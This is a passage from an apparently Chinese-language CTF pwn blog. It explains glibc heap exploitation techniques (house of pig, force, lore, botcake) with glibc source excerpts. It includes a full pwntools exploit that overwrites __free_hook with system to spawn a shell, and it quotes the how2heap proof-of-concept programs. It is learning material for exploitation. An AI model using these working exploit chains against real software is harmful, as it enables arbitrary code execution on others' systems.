b&#x27;/bin/sh\\x00&#x27;+p64(system_addr)*2print(hex(len(file_struct[0x10:])))r.sendline(file_struct[0x10:])\n\n这里解释一下为什么这么构造，把源码扒过来：\nint_IO_str_overflow (FILE *fp, int c)&#123;  int flush_only = c == EOF;  size_t pos;  if (fp-&gt;_flags &amp; _IO_NO_WRITES)      return flush_only ? 0 : EOF;  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))    &#123;      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;    &#125;  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))    &#123;      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */\treturn EOF;      else\t&#123;\t  char *new_buf;\t  char *old_buf = fp-&gt;_IO_buf_base;\t  size_t old_blen = _IO_blen (fp);\t  size_t new_size = 2 * old_blen + 100;\t  if (new_size &lt; old_blen)\t    return EOF;\t  new_buf = malloc (new_size);\t  if (new_buf == NULL)\t    &#123;\t      /*\t  __ferror(fp) = 1; */\t      return EOF;\t    &#125;\t  if (old_buf)\t    &#123;\t      memcpy (new_buf, old_buf, old_blen);\t      free (old_buf);\t      /* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */\t      fp-&gt;_IO_buf_base = NULL;\t    &#125;\t......&#125;\n\n#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)\n\n可以看到这里的old_buf也就是fp-&gt;_IO_buf_base然后old_blen也可以看到上面的定义，所以我们需要构造两个差值为0x18，并且我们可以看到，我们复制的内容也是从old_buf开始的，然后我们分配的tcahce其实是需要写三个p64才能修改到free_hook。\n\n我们这里的思路其实就是修改free_hook为system，那么我们free的时候就需要参数为/bin/sh所以我们old_buf就这样确定了，所以在构造结构体时后面跟了两个p64(system)这里和前面的不一样。\n所以综上得出，expfrom pwn import *elf = ELF(&#x27;./pig&#x27;)r = process(&#x27;./pig&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;&#x27;&#x27;&#x27;struct pig&#123;    chunk_arr[24];    chunk_size[24];    chunk_exist[24];    chunk_freed[24];&#125;struct all_pig&#123;    Peppa_chunk_arr[24];   size: 0xc0    Peppa_chunk_size[24];  size: 0x60    Peppa_chunk_exist[24]; size: 0x18    Peppa_chunk_freed[24]; size: 0x18    Peppa_last_chunk_size; size: 0x4    padding;               size: 0x4    Mummy_chunk_arr[24];   size: 0xc0    Mummy_chunk_size[24];  size: 0x60    Mummy_chunk_exist[24]; size: 0x18    Mummy_chunk_freed[24]; size: 0x18    Mummy_last_chunk_size; size: 0x4    padding;               size: 0x4    Daddy_chunk_arr[24];   size: 0xc0    Daddy_chunk_size[24];  size: 0x60    Daddy_chunk_exist[24]; size: 0x18    Daddy_chunk_freed[24]; size: 0x18    Daddy_last_chunk_size; size: 0x4    padding;               size: 0x4&#125;password&#123;    Peppa: A\\x01\\x95\\xc9\\x1c    Mummy: B\\x01\\x87\\xc3\\x19    Daddy: C\\x01\\xf7\\x3c\\x32&#125;&#x27;&#x27;&#x27;def create(size, content):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Input the message size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;&#x27;s message: &quot;)    r.sendline(content)def show(idx):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Input the message index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))def edit(idx, content):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Input the message index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;&#x27;s message: &quot;)    r.sendline(content)def delete(idx):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;Input the message index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))def change(role):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;5&#x27;)    r.recvuntil(b&#x27;Please enter the identity password of the corresponding user:&#x27;)    if role == 1:        r.sendline(b&#x27;A\\x01\\x95\\xc9\\x1c&#x27;)    elif role == 2:        r.sendline(b&#x27;B\\x01\\x87\\xc3\\x19&#x27;)    else:        r.sendline(b&#x27;C\\x01\\xf7\\x3c\\x32&#x27;)create(0x150, b&#x27;\\n&#x27;*7)  # A0for i in range(7):    create(0x150, b&#x27;\\n&#x27;*7)  # A7    delete(i+1)delete(0)change(2)change(1)show(0)r.recvuntil(b&#x27;The message is: &#x27;)main_arena_96 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]edit(1, b&#x27;a&#x27;*7)show(1)r.recvuntil(b&#x27;The message is: aaaaaaa\\n&#x27;)heap_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x10print(hex(heap_base))change(2)for i in range(5):    create(0x90, b&#x27;\\n&#x27;*3)  # B4    delete(i)change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A8create(0x150, b&#x27;\\n&#x27;*7)  # A9create(0x150, b&#x27;\\n&#x27;*7)  # A10delete(8)change(2)create(0xb0, b&#x27;\\n&#x27;*2)  # B5change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A11delete(10)change(2)create(0xb0, b&#x27;\\n&#x27;*2)  # B6create(0x410, b&#x27;\\n&#x27;*21)  # B7change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A12change(2)create(0x410, b&#x27;\\n&#x27;*22)  # B8change(1)edit(10, b&#x27;a&#x27;*0x40+p64(heap_base+0x12c40) +     p64(libc_base+libc.symbols[&#x27;__free_hook&#x27;]-0x20))create(0x150, b&#x27;\\n&#x27;*7)  # A13change(2)create(0x420, b&#x27;\\n&#x27;*22)  # B9change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A14change(2)delete(9)change(1)create(0x430, b&#x27;\\n&#x27;*22)  # A15change(2)delete(8)edit(9, p64(0)+p64(libc_base+libc.symbols[&#x27;__free_hook&#x27;]-0x28))change(1)create(0x430, b&#x27;\\n&#x27;*22)  # A16change(3)create(0x410, b&#x27;\\n&#x27;*21)  # C0# create(0x90, b&#x27;\\n&#x27;*3)  # C1change(2)edit(9, p64(heap_base+0x13680)*2)edit(8, p64(heap_base+0x13c00)*2)edit(9, p64(0)+p64(libc_base+libc.symbols[&#x27;_IO_list_all&#x27;]-0x20))change(3)delete(0)create(0x430, b&#x27;\\n&#x27;*22)  # C1create(0x440, b&#x27;\\n&#x27;*22)  # C2change(2)edit(9, p64(heap_base+0x13680)*2)edit(8, p64(heap_base+0x13c00)*2)change(3)payload = b&#x27;\\x00&#x27;*0x18+p64(heap_base+0x13c00)payload = payload.ljust(0x158, b&#x27;\\x00&#x27;)create(0x410, payload)  # C3create(0x90, b&#x27;\\n&#x27;*2)  # C4def pack_file(_IO_write_base=0, _IO_write_ptr=0, _IO_buf_base=0, _IO_buf_end=0, vtable=0):    IO_FILE = p64(0)*3+p64(0) + \\        p64(_IO_write_base)+p64(_IO_write_ptr) + \\        p64(0)+p64(_IO_buf_base)+p64(_IO_buf_end)    IO_FILE = IO_FILE.ljust(0xc0, b&#x27;\\x00&#x27;)    IO_FILE += p32(0)    IO_FILE = IO_FILE.ljust(0xd8, b&#x27;\\x00&#x27;)+p64(vtable)    return IO_FILEr.recvuntil(b&quot;Gift:&quot;)_IO_str_jumps = libc_base+0x1ed560system_addr = libc_base+libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))file_struct = pack_file(1, 0xffffffffffff, heap_base +                        0x13c00+0xe0, heap_base+0x13c00+0xe0+0x18, _IO_str_jumps)file_struct += b&#x27;/bin/sh\\x00&#x27;+p64(system_addr)*2print(hex(len(file_struct[0x10:])))r.sendline(file_struct[0x10:])gdb.attach(r)r.recvuntil(b&#x27;Choice:&#x27;)r.sendline(b&#x27;5&#x27;)r.sendline(b&#x27;&#x27;)r.interactive()\n\n\n附件链接：https://github.com/01dwang/house_of_pig\n","categories":["pwn"],"tags":["house of pig","house of 系列"]},{"title":"house of ******","url":"/2022/03/03/house-of/","content":"没错！标题的星号就是脏字！\nhouse of force这个堆利用的方式是控制top chunk，把top chunk跑到任意位置。\n总所周知，在malloc的时候发现bin当中没有合适size的chunk的时候就去会割top chunk，那么是怎么隔的就看一下源码\nvictim = av-&gt;top;size = chunksize (victim);if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))&#123;    remainder_size = size - nb;    remainder = chunk_at_offset (victim, nb);    av-&gt;top = remainder;    set_head (victim, nb | PREV_INUSE |              (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head (remainder, remainder_size | PREV_INUSE);    check_malloced_chunk (av, victim, nb);    void *p = chunk2mem (victim);    alloc_perturb (p, bytes);    return p;&#125;\n\n#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))\n\n通过上面两个片段就很好可以看出来，只要我们top chunk的size大于我们申请的就会进入内部，然后注意remainder = chunk_at_offset (victim, nb);也就是当前的top chunk的地址加上申请的size，下面av-&gt;top = remainder;将地址赋值给top chunk，不过这里的问题则是如果我们后面给到一个负值，那么我们的top chunk就可以跑到任意地方了。所以来看看how2heap的poc：\n/*   This PoC works also with ASLR enabled.   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum    ( http://phrack.org/issues/66/10.html )   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04*/#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;assert.h&gt;char bss_var[] = &quot;This is a string that we want to overwrite.&quot;;int main(int argc , char* argv[])&#123;\tfprintf(stderr, &quot;\\nWelcome to the House of Force\\n\\n&quot;);\tfprintf(stderr, &quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\\n&quot;);\tfprintf(stderr, &quot;The top chunk is a special chunk. Is the last in memory &quot;\t\t&quot;and is the chunk that will be resized when malloc asks for more space from the os.\\n&quot;);\tfprintf(stderr, &quot;\\nIn the end, we will use this to overwrite a variable at %p.\\n&quot;, bss_var);\tfprintf(stderr, &quot;Its current value is: %s\\n&quot;, bss_var);\tfprintf(stderr, &quot;\\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\\n&quot;);\tintptr_t *p1 = malloc(256);\tfprintf(stderr, &quot;The chunk of 256 bytes has been allocated at %p.\\n&quot;, p1 - 2);\tfprintf(stderr, &quot;\\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\\n&quot;);\tint real_size = malloc_usable_size(p1);\tfprintf(stderr, &quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\\n&quot;, real_size + sizeof(long)*2);\tfprintf(stderr, &quot;\\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\\n&quot;);\t//----- VULNERABILITY ----\tintptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));\tfprintf(stderr, &quot;\\nThe top chunk starts at %p\\n&quot;, ptr_top);\tfprintf(stderr, &quot;\\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\\n&quot;);\tfprintf(stderr, &quot;Old size of top chunk %#llx\\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));\t*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;\tfprintf(stderr, &quot;New size of top chunk %#llx\\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));\t//------------------------\tfprintf(stderr, &quot;\\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\\n&quot;\t   &quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\\n&quot;\t   &quot;overflow) and will then be able to allocate a chunk right over the desired region.\\n&quot;);\t/*\t * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):\t * new_top = old_top + nb\t * nb = new_top - old_top\t * req + 2sizeof(long) = new_top - old_top\t * req = new_top - old_top - 2sizeof(long)\t * req = dest - 2sizeof(long) - old_top - 2sizeof(long)\t * req = dest - old_top - 4*sizeof(long)\t */\tunsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;\tfprintf(stderr, &quot;\\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\\n&quot;\t   &quot;we will malloc %#lx bytes.\\n&quot;, bss_var, ptr_top, evil_size);\tvoid *new_ptr = malloc(evil_size);\tfprintf(stderr, &quot;As expected, the new pointer is at the same place as the old top chunk: %p\\n&quot;, new_ptr - sizeof(long)*2);\tvoid* ctr_chunk = malloc(100);\tfprintf(stderr, &quot;\\nNow, the next chunk we overwrite will point at our target buffer.\\n&quot;);\tfprintf(stderr, &quot;malloc(100) =&gt; %p!\\n&quot;, ctr_chunk);\tfprintf(stderr, &quot;Now, we can finally overwrite that value:\\n&quot;);\tfprintf(stderr, &quot;... old string: %s\\n&quot;, bss_var);\tfprintf(stderr, &quot;... doing strcpy overwrite with \\&quot;YEAH!!!\\&quot;...\\n&quot;);\tstrcpy(ctr_chunk, &quot;YEAH!!!&quot;);\tfprintf(stderr, &quot;... new string: %s\\n&quot;, bss_var);\tassert(ctr_chunk == bss_var);\t// some further discussion:\t//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\\n\\n&quot;);\t//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;\t//\t&quot;and we \\nwant to set this result to the address of malloc_got_address-8\\n\\n&quot;);\t//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\\n\\n&quot;);\t//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\\n\\n&quot;);\t//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;\t//\t&quot;\\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\\n\\n&quot;);\t//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\\n&quot;,p2);\t//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\\n&quot;,malloc_got_address);\t//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\\n&quot;);&#125;\n\n上面的poc很清楚了，可以下去-g调一下。\nif (__glibc_unlikely (size &gt; av-&gt;system_mem))    malloc_printerr (&quot;malloc(): corrupted top size&quot;);\n\n以上片段是在glibc2.29当中新加的导致无法进行此种方法了。\nhouse of loraGlibc2.23这个攻击方式是针对small bin的攻击，先看源码：\nif (in_smallbin_range (nb))&#123;    idx = smallbin_index (nb);    bin = bin_at (av, idx);    if ((victim = last (bin)) != bin)    &#123;        if (victim == 0) /* initialization check */            malloc_consolidate (av);        else        &#123;            bck = victim-&gt;bk;            if (__glibc_unlikely (bck-&gt;fd != victim))            &#123;                errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;                goto errout;            &#125;            set_inuse_bit_at_offset (victim, nb);            bin-&gt;bk = bck;            bck-&gt;fd = bin;            if (av != &amp;main_arena)                victim-&gt;size |= NON_MAIN_ARENA;            check_malloced_chunk (av, victim, nb);            void *p = chunk2mem (victim);            alloc_perturb (p, bytes);            return p;        &#125;    &#125;&#125;\n\n可以看到上面的操作是将最后一个chunk的bk赋值给bck，然后再把bin-&gt;bk=bck就把这个small bin chunk加入到了small bin中去了，不过需要绕过bck-&gt;fd!=victim，这里给出poc：\n/*Advanced exploitation of the House of Lore - Malloc Maleficarum.This PoC take care also of the glibc hardening of smallbin corruption.[ ... ]else    &#123;      bck = victim-&gt;bk;    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;                  goto errout;                &#125;       set_inuse_bit_at_offset (victim, nb);       bin-&gt;bk = bck;       bck-&gt;fd = bin;       [ ... ]*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;void jackpot()&#123; fprintf(stderr, &quot;Nice jump d00d\\n&quot;); exit(0); &#125;int main(int argc, char * argv[])&#123;  intptr_t* stack_buffer_1[4] = &#123;0&#125;;  intptr_t* stack_buffer_2[3] = &#123;0&#125;;  fprintf(stderr, &quot;\\nWelcome to the House of Lore\\n&quot;);  fprintf(stderr, &quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\\n&quot;);  fprintf(stderr, &quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\\n\\n&quot;);  fprintf(stderr, &quot;Allocating the victim chunk\\n&quot;);  intptr_t *victim = malloc(0x100);  fprintf(stderr, &quot;Allocated the first small chunk on the heap at %p\\n&quot;, victim);  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk  intptr_t *victim_chunk = victim-2;  fprintf(stderr, &quot;stack_buffer_1 at %p\\n&quot;, (void*)stack_buffer_1);  fprintf(stderr, &quot;stack_buffer_2 at %p\\n&quot;, (void*)stack_buffer_2);  fprintf(stderr, &quot;Create a fake chunk on the stack\\n&quot;);  fprintf(stderr, &quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;         &quot;in second to the last malloc, which putting stack address on smallbin list\\n&quot;);  stack_buffer_1[0] = 0;  stack_buffer_1[1] = 0;  stack_buffer_1[2] = victim_chunk;  fprintf(stderr, &quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;         &quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;         &quot;chunk on stack&quot;);  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;    fprintf(stderr, &quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;         &quot;the small one during the free()\\n&quot;);  void *p5 = malloc(1000);  fprintf(stderr, &quot;Allocated the large chunk on the heap at %p\\n&quot;, p5);  fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin\\n&quot;, victim);  free((void*)victim);  fprintf(stderr, &quot;\\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\\n&quot;);  fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]);  fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]);  fprintf(stderr, &quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\\n&quot;);  fprintf(stderr, &quot;This means that the chunk %p will be inserted in front of the SmallBin\\n&quot;, victim);  void *p2 = malloc(1200);  fprintf(stderr, &quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\\n&quot;, p2);  fprintf(stderr, &quot;The victim chunk has been sorted and its fwd and bk pointers updated\\n&quot;);  fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]);  fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]);  //------------VULNERABILITY-----------  fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\\n&quot;);  victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack  //------------------------------------  fprintf(stderr, &quot;Now allocating a chunk with size equal to the first one freed\\n&quot;);  fprintf(stderr, &quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\\n&quot;);  void *p3 = malloc(0x100);  fprintf(stderr, &quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\\n&quot;);  char *p4 = malloc(0x100);  fprintf(stderr, &quot;p4 = malloc(0x100)\\n&quot;);  fprintf(stderr, &quot;\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n&quot;,         stack_buffer_2[2]);  fprintf(stderr, &quot;\\np4 is %p and should be on the stack!\\n&quot;, p4); // this chunk will be allocated on stack  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode  memcpy((p4+40), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary  // sanity check  assert((long)__builtin_return_address(0) == (long)jackpot);&#125;\n\n一样的上面的poc确实写的非常详细，自己下去调\nGlibc 2.27后此时就出现了tcache，存在了前几天的机制：\nif (in_smallbin_range (nb))&#123;    idx = smallbin_index (nb);    bin = bin_at (av, idx);    if ((victim = last (bin)) != bin)    &#123;        bck = victim-&gt;bk;        if (__glibc_unlikely (bck-&gt;fd != victim))            malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);        set_inuse_bit_at_offset (victim, nb);        bin-&gt;bk = bck;        bck-&gt;fd = bin;        if (av != &amp;main_arena)            set_non_main_arena (victim);        check_malloced_chunk (av, victim, nb);        #if USE_TCACHE        /* While we&#x27;re here, if we see other chunks of the same size,\t     stash them in the tcache.  */        size_t tc_idx = csize2tidx (nb);        if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)        &#123;            mchunkptr tc_victim;            /* While bin not empty and tcache not full, copy chunks over.  */            while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count                   &amp;&amp; (tc_victim = last (bin)) != bin)            &#123;                if (tc_victim != 0)                &#123;                    bck = tc_victim-&gt;bk;                    set_inuse_bit_at_offset (tc_victim, nb);                    if (av != &amp;main_arena)                        set_non_main_arena (tc_victim);                    bin-&gt;bk = bck;                    bck-&gt;fd = bin;                    tcache_put (tc_victim, tc_idx);                &#125;            &#125;        &#125;        #endif        void *p = chunk2mem (victim);        alloc_perturb (p, bytes);        return p;    &#125;&#125;\n\n当我们把chunk放进了small bin就会马上进入到tcache内，并且还是个while循环，所以其实有了tcache之后这个就很难利用了，但是依旧是可以利用：\n/*Advanced exploitation of the House of Lore - Malloc Maleficarum.This PoC take care also of the glibc hardening of smallbin corruption.[ ... ]else    &#123;      bck = victim-&gt;bk;    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;                  goto errout;                &#125;       set_inuse_bit_at_offset (victim, nb);       bin-&gt;bk = bck;       bck-&gt;fd = bin;       [ ... ]*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;void jackpot()&#123; fprintf(stderr, &quot;Nice jump d00d\\n&quot;); exit(0); &#125;int main(int argc, char * argv[])&#123;  intptr_t* stack_buffer_1[4] = &#123;0&#125;;  intptr_t* stack_buffer_2[3] = &#123;0&#125;;  void* fake_freelist[7][4];  fprintf(stderr, &quot;\\nWelcome to the House of Lore\\n&quot;);  fprintf(stderr, &quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\\n&quot;);  fprintf(stderr, &quot;This is tested against Ubuntu 20.04.2 - 64bit - glibc-2.31\\n\\n&quot;);  fprintf(stderr, &quot;Allocating the victim chunk\\n&quot;);  intptr_t *victim = malloc(0x100);  fprintf(stderr, &quot;Allocated the first small chunk on the heap at %p\\n&quot;, victim);  fprintf(stderr, &quot;Allocating dummy chunks for using up tcache later\\n&quot;);  void *dummies[7];  for(int i=0; i&lt;7; i++) dummies[i] = malloc(0x100);  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk  intptr_t *victim_chunk = victim-2;  fprintf(stderr, &quot;stack_buffer_1 at %p\\n&quot;, (void*)stack_buffer_1);  fprintf(stderr, &quot;stack_buffer_2 at %p\\n&quot;, (void*)stack_buffer_2);  fprintf(stderr, &quot;Create a fake free-list on the stack\\n&quot;);  for(int i=0; i&lt;6; i++) &#123;    fake_freelist[i][3] = fake_freelist[i+1];  &#125;  fake_freelist[6][3] = NULL;  fprintf(stderr, &quot;fake free-list at %p\\n&quot;, fake_freelist);  fprintf(stderr, &quot;Create a fake chunk on the stack\\n&quot;);  fprintf(stderr, &quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;         &quot;in second to the last malloc, which putting stack address on smallbin list\\n&quot;);  stack_buffer_1[0] = 0;  stack_buffer_1[1] = 0;  stack_buffer_1[2] = victim_chunk;  fprintf(stderr, &quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;         &quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;         &quot;chunk on stack&quot;);  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;  fprintf(stderr, &quot;Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash &quot;          &quot;introduced by smallbin-to-tcache mechanism\\n&quot;);  stack_buffer_2[3] = (intptr_t *)fake_freelist[0];    fprintf(stderr, &quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;         &quot;the small one during the free()\\n&quot;);  void *p5 = malloc(1000);  fprintf(stderr, &quot;Allocated the large chunk on the heap at %p\\n&quot;, p5);  fprintf(stderr, &quot;Freeing dummy chunk\\n&quot;);  for(int i=0; i&lt;7; i++) free(dummies[i]);  fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin\\n&quot;, victim);  free((void*)victim);  fprintf(stderr, &quot;\\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\\n&quot;);  fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]);  fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]);  fprintf(stderr, &quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\\n&quot;);  fprintf(stderr, &quot;This means that the chunk %p will be inserted in front of the SmallBin\\n&quot;, victim);  void *p2 = malloc(1200);  fprintf(stderr, &quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\\n&quot;, p2);  fprintf(stderr, &quot;The victim chunk has been sorted and its fwd and bk pointers updated\\n&quot;);  fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]);  fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]);  //------------VULNERABILITY-----------  fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\\n&quot;);  victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack  //------------------------------------  fprintf(stderr, &quot;Now take all dummies chunk in tcache out\\n&quot;);  for(int i=0; i&lt;7; i++) malloc(0x100);  fprintf(stderr, &quot;Now allocating a chunk with size equal to the first one freed\\n&quot;);  fprintf(stderr, &quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\\n&quot;);  void *p3 = malloc(0x100);  fprintf(stderr, &quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\\n&quot;);  char *p4 = malloc(0x100);  fprintf(stderr, &quot;p4 = malloc(0x100)\\n&quot;);  fprintf(stderr, &quot;\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n&quot;,         stack_buffer_2[2]);  fprintf(stderr, &quot;\\np4 is %p and should be on the stack!\\n&quot;, p4); // this chunk will be allocated on stack  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode  long offset = (long)__builtin_frame_address(0) - (long)p4;  memcpy((p4+offset+8), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary  // sanity check  assert((long)__builtin_return_address(0) == (long)jackpot);&#125;\n\n可以看到，他这里是创建了一个假的fake_freelist，这个的作用就是到最后while循环时，将所有内容放入到tcache中，不然会引起崩溃\n\nhouse of botcake在glibc2.27里的tcache是什么验证都没加\nif (tcache    &amp;&amp; tc_idx &lt; mp_.tcache_bins    &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)&#123;    tcache_put (p, tc_idx);    return;&#125;\n\n所以可以很轻易的double free，但是在glibc2.29之后就不一样了：\nif (__glibc_unlikely (e-&gt;key == tcache))&#123;    tcache_entry *tmp;    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);    for (tmp = tcache-&gt;entries[tc_idx];         tmp;         tmp = tmp-&gt;next)        if (tmp == e)            malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);    /* If we get here, it was a coincidence.  We&#x27;ve wasted a\t       few cycles, but don&#x27;t abort.  */&#125;if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)&#123;    tcache_put (p, tc_idx);    return;&#125;\n\n但是一样有办法可以让tcache存在我们指定地址的fake chunk，下面看poc：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;int main()&#123;    /*     * This attack should bypass the restriction introduced in     * 